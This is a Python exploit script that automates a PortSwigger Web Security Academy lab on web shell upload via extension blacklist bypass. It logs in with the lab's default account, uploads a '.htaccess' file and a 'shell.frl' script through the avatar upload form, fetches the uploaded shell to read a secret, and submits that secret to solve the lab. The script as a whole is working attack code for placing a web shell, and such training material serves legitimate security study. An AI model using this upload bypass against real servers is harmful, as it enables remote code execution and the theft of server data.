#!/usr/bin/env python3
# Lab: Web shell upload via extension blacklist bypass
# Lab-Link: https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-extension-blacklist-bypass
# Difficulty: PRACTITIONER
from bs4 import BeautifulSoup
import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


def get_csrf_token(text):
    soup = BeautifulSoup(text, 'html.parser')
    result = soup.find('input', attrs={'name': 'csrf'})['value']
    return result


def login(client, host, username, password):
    url = f'{host}/login'
    data = {'csrf': get_csrf_token(client.get(url).text),
            'username': username,
            'password': password}
    res = client.post(url, data=data)
    return f'Your username is: {username}' in res.text


def upload_file(client, host, filename):
    files = {'avatar': (filename, open(filename, 'r'))}
    values = {'user': 'wiener', 'csrf': get_csrf_token(client.get(f'{host}/my-account').text)}
    r = client.post(f'{host}/my-account/avatar', files=files, data=values)
    return r


def submit_solution(client, host, answer):
    data = {'answer': answer}
    if '"correct":true' in client.post(f'{host}/submitSolution', data=data).text:
        return True
    return False


def main():
    print('[+] Lab: Web shell upload via extension blacklist bypass')
    try:
        host = sys.argv[1].strip().rstrip('/')
    except IndexError:
        print(f'Usage: {sys.argv[0]} <HOST>')
        print(f'Exampe: {sys.argv[0]} http://www.example.com')
        sys.exit(-1)

    client = requests.Session()
    client.verify = False
    client.proxies = proxies

    if not login(client, host, 'wiener', 'peter'):
        print(f'[-] Failed to login as wiener')
        sys.exit(-2)
    print(f'[+] Logged in as wiener')

    filename = '.htaccess'
    r = upload_file(client, host, filename)
    if r.status_code != 200:
        print(f'[-] Failed to upload .htaccess file')
        sys.exit(-3)
    print(f'[+] Malicious .htaccess uploaded')

    filename = 'shell.frl'
    r = upload_file(client, host, filename)
    if r.status_code != 200:
        print(f'[-] Failed to upload script file')
        sys.exit(-4)
    print(f'[+] Malicious file uploaded')

    r = client.get(f'{host}/files/avatars/{filename}')
    if r.status_code != 200:
        print(f'[-] Failed to find uploaded script file')
        sys.exit(-5)

    secret = r.text
    print(f'[+] Secret string is "{secret}"')
    if submit_solution(client, host, secret):
        print(f'[+] Successfully submitted secret, lab solved')
    else:
        print(f'[-] Failed to solve lab')


if __name__ == "__main__":
    main()
